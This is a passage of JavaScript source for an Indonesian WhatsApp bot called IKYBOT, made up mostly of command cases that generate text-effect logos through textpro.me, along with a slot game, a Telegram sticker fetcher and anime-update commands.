  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break
	
	
	
	
	
	case '3dspace':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks|teks`)
	setReply(mess.wait)
	teks1 = q.split("|")[0]
	teks2 = q.split("|")[1]
	textpro("https://textpro.me/create-space-3d-text-effect-online-985.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break
	
	
	
	case 'lion':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks|teks`)
	setReply(mess.wait)
	teks1 = q.split("|")[0]
	teks2 = q.split("|")[1]
	textpro("https://textpro.me/create-lion-logo-mascot-online-938.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break
	
	
case 'slot':
            case 'slots':
              if (isBanned) return reply(mess.ban)
            const somtoy = sotoy[Math.floor(Math.random() * sotoy.length)]
            ikyc.sendMessage(from, `[  🎰 | SLOTS ]\n-----------------\n🍋 : 🍌 : 🍍\n${somtoy} <=====||\n🍋 : 🍌 : 🍍\n[  🎰 | SLOTS ]\n\nKeterangan : Jika anda Mendapatkan 3Buah Sama Berarti Anda Menang\n\nContoh : 🍌 : 🍌 : 🍌<=====`, MessageType.text, { quoted: iky })
            sendButMessage(from, `Mau main lagi?`, `Pencet tombol di bawah`, [
          {
            buttonId: `${prefix}slot`,
            buttonText: {
              displayText: `Play Again`,
            },
            type: 1,
          },
        ]);
            break;	
	
	case '3dneon':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/create-3d-neon-light-text-effect-online-1028.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break
case 'harrypotter':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/create-harry-potter-text-effect-online-1025.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break
case 'deepsea':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/create-3d-deep-sea-metal-text-effect-online-1053.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break
case 'underwater':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/3d-underwater-text-effect-generator-online-1013.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break
case 'bearlogo':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/online-black-and-white-bear-mascot-logo-creation-1012.htmll", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break
case 'avanger':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/create-3d-avengers-logo-online-974.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break



case 'stone':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/3d-stone-cracked-cool-text-effect-1029.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break
	
	case 'neon':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/neon-text-effect-online-879.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break                   
	
	case 'greenneon':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/green-neon-text-effect-874.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break
   case 'bokeh':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/bokeh-text-effect-876.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break
   
   
	
	
	case 'hollographic':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/holographic-3d-text-effect-975.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break
	
	
	
	case 'bear':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	teks1 = q.split("|")[0]
	teks2 = q.split("|")[1]
	textpro("https://textpro.me/online-black-and-white-bear-mascot-logo-creation-1012.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break
	
	
	
	
	case 'wolf':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	teks1 = q.split("|")[0]
	teks2 = q.split("|")[1]
	textpro("https://textpro.me/create-wolf-logo-galaxy-online-936.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break

	
	
	
	
	case 'joker':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/create-logo-joker-online-934.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break
	
	case 'dropwater':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/dropwater-text-effect-872.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break
case 'rainbow':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/rainbow-equalizer-text-effect-902.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break
case 'city':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/happ-new-year-card-firework-gif-959.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break	
	case 'firework':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/firework-sparkle-text-effect-930.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break
	case 'devil':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break
case 'tecno':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/create-a-futuristic-technology-neon-light-text-effect-1006.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break
case 'matrix':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/matrix-style-text-effect-online-884.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break
case 'thunder2':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/online-thunder-text-effect-generator-1031.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break
case 'berry':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/create-berry-text-effect-online-free-1033.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break
case 'neonlight':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/create-glowing-neon-light-text-effect-online-free-1061.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break
case 'chocholate':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/chocolate-cake-text-effect-890.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break
case 'bread':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/bread-text-effect-online-887.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break
case 'honey':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/honey-text-effect-868.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break
case 'biscuit':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/biscuit-text-effect-858.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break
case 'bagel':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/bagel-text-effect-857.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break
case 'candy':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/pink-candy-text-effect-832.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break
                case 'telesticker':
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://t.me/addstickers/LINE_Menhera_chan_ENG`)
                    ini_url = args[0]
                    ini_url = await fetchJson(`https://api.lolhuman.xyz/api/telestick?apikey=${apikey}&url=${ini_url}`)
                    ini_sticker = ini_url.result.sticker
                    for (sticker_ in ini_sticker) {
                        ini_buffer = await getBuffer(ini_sticker[sticker_])
                        await ikyc.sendMessage(from, ini_buffer, sticker)
                    }
                    break
case 'spooky':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/create-halloween-skeleton-text-effect-online-1047.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break
case 'demon':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/create-green-horror-style-text-effect-online-1036.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break
case 'embossed':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/create-embossed-text-effect-on-cracked-surface-1024.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break
case 'brokenglass':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/broken-glass-text-effect-free-online-1023.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break
case 'paper':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/create-art-paper-cut-text-effect-online-1022.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break
case '1917':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/1917-style-text-effect-online-980.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break
case 'natal':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/create-a-christmas-holiday-snow-text-effect-1007.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break
case 'cloud':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/create-a-cloud-text-effect-on-the-sky-online-1004.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break
case 'spearkling1':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/pink-sparkling-jewelry-text-effect-899.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break
case 'spearkling2':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/blue-sparkling-jewelry-text-effect-898.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break
case 'spearkling3':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/green-sparkling-jewelry-text-effect-897.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break
case 'spearkling4':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/gold-sparkling-jewelry-text-effect-895.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break
case 'spearkling5':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/cyan-sparkling-jewelry-text-effect-893.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break
case 'america':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/create-american-flag-3d-text-effect-online-1051.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break
case 'minion':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/minion-text-effect-3d-online-978.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break
case 'halloween':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/halloween-fire-text-effect-940.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break
case 'robots':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/robot-r2-d2-text-effect-903.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break
case 'blood':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/blood-text-on-the-frosted-glass-941.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break


	case 'neonlight':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/neon-light-text-effect-with-galaxy-style-981.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break
	
	
	case 'thewall':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/break-wall-text-effect-871.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break
	
	case 'captain':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/captain-america-text-effect-905.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break			
	case 'natural':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/natural-leaves-text-effect-931.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break	
	case 'carbon':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/carbon-text-effect-833.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break
case 'thunder':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/create-thunder-text-effect-online-881.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break		
	case 'pencil':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/create-a-sketch-text-effect-online-1044.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break
case 'transformer':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/create-a-transformer-text-effect-online-1035.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break
case 'grav':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break	
	
	
	
        case 'otakuongoing':
        foto = "https://scontent.fsoc1-1.fna.fbcdn.net/v/t1.6435-9/fr/cp0/e15/q65/188003580_4116632188418959_278745899359955746_n.jpg?_nc_cat=103&ccb=1-5&_nc_sid=dd9801&efg=eyJpIjoidCJ9&_nc_eui2=AeG4z3lv0O18aOogz9z4bTKXs2y4Py2lZA6zbLg_LaVkDlt2CdW-kPfFvP1J7CerX8cxRV77uMn7qmIDWOp5lF1y&_nc_ohc=AbIIeSsQe_QAX8xtiGD&tn=UG311hBS0PFny35a&_nc_ht=scontent.fsoc1-1.fna&oh=69b3b9e62b37fe616d06d66aa3b2c061&oe=61C2FB93"
        fotonya = await getBuffer(foto)
        let buttonoy = [{"buttonId": `INFO BOTZ`,"buttonText": {"displayText": `Done`},"type": "RESPONSE"}]
        onGoing().then(res => {  	
        update = `\nBerikut adalah update anime yang akan datang\n\n`
        for ( let i of res){
        update +=`Judul: ${i.judul}\nEpisode: ${i.eps}\nHari: ${i.hri}\nTanggal: ${i.tgl}\n\n`
        }
     sendButLocation(from, update, copyright, fotonya, buttonoy, {contextInfo: forward})
    
})
break
        
        
        
        
        
        
        
        
        case 'samehadaku':
        try{
          dato = await fetchJson(`https://zenzapi.xyz/api/samehadaku?apikey=${zenzkey}`)
         data = dato.result
         update = `\n*Berikut adalah update anime di samehadaku*\n`
         for ( let i of data){
    update +=`
Anime        : ${i.title}
Episode     : ${i.episode}
Posted By : ${i.postedBy}
Release     : ${i.release_time}\n`
foto = `${i.image}`
    }
    
